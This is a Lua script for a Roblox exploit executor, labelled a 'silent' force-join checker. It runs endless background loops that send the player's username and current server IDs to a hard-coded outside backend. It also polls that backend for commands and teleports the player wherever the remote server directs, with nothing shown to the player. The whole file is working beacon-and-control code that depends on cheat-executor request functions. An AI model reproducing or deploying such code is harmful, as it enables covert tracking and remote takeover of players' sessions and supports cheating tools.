--// Universal Force Join Checker - Silent Version //--

local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")
local localPlayer = Players.LocalPlayer

local BACKEND_URL = "https://discordbot-production-800b.up.railway.app"
local CHECK_INTERVAL = 3
local HEARTBEAT_INTERVAL = 10

-- Function to perform the actual teleport
local function performTeleport(placeId, jobId)
    local placeIdNum = tonumber(placeId)
    
    -- Try multiple teleport methods
    spawn(function()
        -- Method 1: Standard TeleportToPlaceInstance
        local s1, e1 = pcall(function()
            TeleportService:TeleportToPlaceInstance(placeIdNum, jobId, localPlayer)
        end)
        
        if not s1 then
            wait(0.5)
            -- Method 2: Try Teleport first if different game
            if game.PlaceId ~= placeIdNum then
                pcall(function()
                    TeleportService:Teleport(placeIdNum, localPlayer)
                end)
            end
        end
    end)
end

-- Check for force join commands
local function checkForceJoin()
    local username = localPlayer.Name:lower()
    local checkUrl = BACKEND_URL .. "/forcejoin/" .. username
    
    local success, result
    if syn and syn.request then
        success, result = pcall(syn.request, {
            Url = checkUrl,
            Method = "GET",
            Headers = {["Content-Type"] = "application/json"}
        })
    elseif request then
        success, result = pcall(request, {
            Url = checkUrl,
            Method = "GET",
            Headers = {["Content-Type"] = "application/json"}
        })
    elseif http_request then
        success, result = pcall(http_request, {
            Url = checkUrl,
            Method = "GET",
            Headers = {["Content-Type"] = "application/json"}
        })
    elseif http and http.request then
        success, result = pcall(http.request, {
            Url = checkUrl,
            Method = "GET",
            Headers = {["Content-Type"] = "application/json"}
        })
    end
    
    if success and result then
        local body = result.Body or result
        if type(body) == "string" then
            local parseSuccess, data = pcall(function()
                return HttpService:JSONDecode(body)
            end)
            
            if parseSuccess and data and data.hasCommand then
                performTeleport(data.placeId, data.jobId)
            end
        end
    end
end

-- Send heartbeat
local function sendHeartbeat()
    local payload = {
        username = localPlayer.Name,
        serverId = tostring(game.PlaceId),
        jobId = tostring(game.JobId),
        placeId = tostring(game.PlaceId)
    }
    
    local json = HttpService:JSONEncode(payload)
    
    if syn and syn.request then
        pcall(syn.request, {
            Url = BACKEND_URL .. "/players/heartbeat",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = json
        })
    elseif request then
        pcall(request, {
            Url = BACKEND_URL .. "/players/heartbeat",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = json
        })
    elseif http_request then
        pcall(http_request, {
            Url = BACKEND_URL .. "/players/heartbeat",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = json
        })
    elseif http and http.request then
        pcall(http.request, {
            Url = BACKEND_URL .. "/players/heartbeat",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = json
        })
    end
end

-- Main loop
spawn(function()
    while true do
        pcall(sendHeartbeat)
        pcall(checkForceJoin)
        wait(HEARTBEAT_INTERVAL)
    end
end)

-- Faster check loop for force join commands
spawn(function()
    wait(2) -- Initial delay
    while true do
        pcall(checkForceJoin)
        wait(CHECK_INTERVAL)
    end
end)
